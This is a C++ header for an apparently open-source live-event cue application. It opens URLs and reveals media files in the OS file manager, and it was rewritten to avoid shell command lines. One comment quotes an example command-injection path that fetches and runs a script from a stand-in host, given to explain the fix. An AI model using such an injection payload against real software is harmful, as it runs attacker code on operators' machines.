// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Deckboy Contributors
// This file is part of Deckboy, a cue deck for live events.
// See LICENSE for details.

// ============================================================================
// system_browser.hpp — Open a URL in the operator's default browser.
//
// Used by the dependency prompt to send the operator to the official vendor
// download page (NDI Tools, Blackmagic Desktop Video, WebView2 Runtime).
// We do NOT auto-download installers — the vendor's own page tracks the
// current build, signs it, and lays out the install instructions. Pointing
// at the official page keeps Deckboy out of the middle of that chain.
//
// Header-only. No .cpp counterpart.
// ============================================================================

#pragma once

// NOTHING HERE MAY GO THROUGH A SHELL.
//
// These take a URL and a MEDIA PATH, and a media path comes out of the show
// file -- which is a document people send each other. Both used to be pasted
// into a std::system() command line inside double quotes, and double quotes do
// not disarm a shell: $, backtick and " itself all still work. A cue whose
// path was
//
//     /tmp/x";curl evil.example/x|sh;"
//
// ran that the moment an operator picked "show in explorer" on it. Opening
// somebody's show is meant to be safe.
//
// spawnDetachedProcess takes an argv VECTOR and never builds a command line,
// so there is no shell to escape from and nothing to get the quoting right
// for. On Windows ShellExecuteW was already argv-shaped and is unchanged.
#include "core/subprocess.hpp"

#include <string>
#include <vector>

#if defined(_WIN32)
  #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
  #endif
  #include <windows.h>
  #include <shellapi.h>
  #include <shlobj.h>
#else
  #include <cstdlib>
#endif

namespace deckboy::platform {

// Launch the operator's default browser pointed at `url`. Returns true on
// best-effort success — we cannot tell whether the user actually saw the
// page, only that the OS handed off the URL. Silently no-ops on an empty
// URL so callers can use it unconditionally.
inline bool openExternalUrl(const std::string& url) {
  if (url.empty()) {
    return false;
  }
#if defined(_WIN32)
  // ShellExecuteW with a UTF-16 URL hands off to the registered HTTP handler
  // (typically Edge, Chrome, or Firefox). SW_SHOWNORMAL is the default
  // window state — same as launching the browser by hand.
  int wlen = ::MultiByteToWideChar(CP_UTF8, 0, url.c_str(), -1, nullptr, 0);
  if (wlen <= 0) {
    return false;
  }
  std::wstring wurl(wlen, L'\0');
  ::MultiByteToWideChar(CP_UTF8, 0, url.c_str(), -1, &wurl[0], wlen);
  HINSTANCE result = ::ShellExecuteW(nullptr, L"open", wurl.c_str(),
                                      nullptr, nullptr, SW_SHOWNORMAL);
  return reinterpret_cast<INT_PTR>(result) > 32;
#else
  // ALSO A REAL RESULT. std::system on a backgrounded command returns the
  // shell's status, which is 0 whether or not the opener exists -- so this
  // reported success on a machine with no xdg-open at all.
  #if defined(__APPLE__)
  const char* opener = "open";
  #else
  const char* opener = "xdg-open";
  #endif
  // Unqualified: subprocess.hpp declares these at global scope, and this
  // branch is #else-guarded so Windows never compiles it -- a namespace
  // that does not exist would have reached CI, not the desk.
  ChildProcess child;
  // Spawn, then RELEASE. Returning from here destroys `child`, and the
  // destructor kills -- so the opener that was handing the URL to the
  // browser got SIGKILLed on its way out the door.
  if (!spawnDetachedProcess(child, {opener, url})) {
    return false;
  }
  child.release();
  return true;
#endif
}

// Reveal a file in the OS file manager (Explorer / Finder / whatever handles
// the folder on Linux), selecting it where the platform supports selection.
// Best-effort like openExternalUrl. No-ops on an empty path.
inline bool revealFileInFileManager(const std::string& path) {
  if (path.empty()) {
    return false;
  }
#if defined(_WIN32)
  // THE SHELL API, NOT A COMMAND LINE.
  //
  // This used to run  explorer.exe /select,"C:\path\file.mp4"  and it worked
  // for most files while silently degrading to "just open the folder" for the
  // rest, because Explorer's own argument parser splits that switch on COMMAS
  // -- inside the quotes as well as outside them. So any file with a comma in
  // its name or its folder opened the directory with nothing selected, which
  // is exactly the fault reported against a clip called
  // "...Awesome Show, Great Job! - 01X08 - Anniversary.avi".
  //
  // SHOpenFolderAndSelectItems takes the path as a PIDL, so there is no
  // quoting, escaping or delimiter left to get wrong.
  std::string native = path;
  for (char& c : native) {
    if (c == '/') c = '\\';
  }
  int wlen = ::MultiByteToWideChar(CP_UTF8, 0, native.c_str(), -1, nullptr, 0);
  if (wlen <= 0) {
    return false;
  }
  std::wstring wpath(static_cast<std::size_t>(wlen), L'\0');
  ::MultiByteToWideChar(CP_UTF8, 0, native.c_str(), -1, &wpath[0], wlen);
  while (!wpath.empty() && wpath.back() == L'\0') {
    wpath.pop_back();
  }

  // The shell needs COM on this thread. RPC_E_CHANGED_MODE means somebody
  // else already initialised it in the other apartment model, which is fine
  // to work in -- but it must NOT be balanced with CoUninitialize, or we
  // would tear down an apartment we do not own.
  const HRESULT initHr = ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
  const bool ownsCom = SUCCEEDED(initHr);

  bool ok = false;
  PIDLIST_ABSOLUTE pidl = nullptr;
  if (SUCCEEDED(::SHParseDisplayName(wpath.c_str(), nullptr, &pidl, 0, nullptr)) && pidl) {
    ok = SUCCEEDED(::SHOpenFolderAndSelectItems(pidl, 0, nullptr, 0));
    ::CoTaskMemFree(pidl);
  }
  if (ownsCom) {
    ::CoUninitialize();
  }
  if (ok) {
    return true;
  }
  // LAST RESORT: open the containing folder. Better than nothing when the
  // path has gone away between the menu opening and the click.
  const std::size_t slash = native.find_last_of('\\');
  if (slash == std::string::npos) {
    return false;
  }
  return openExternalUrl(native.substr(0, slash));
#elif defined(__APPLE__)
  ChildProcess child;
  if (!spawnDetachedProcess(child, {"open", "-R", path})) {
    return false;
  }
  child.release();   // Finder is not ours to kill on the way out
  return true;
#else
  // No portable "select" on Linux; open the containing directory.
  std::string dir = path;
  auto slash = dir.find_last_of('/');
  if (slash != std::string::npos) {
    dir = dir.substr(0, slash);
  }
  ChildProcess child;
  if (!spawnDetachedProcess(child, {"xdg-open", dir})) {
    return false;
  }
  child.release();   // the file manager outlives the call
  return true;
#endif
}

}  // namespace deckboy::platform
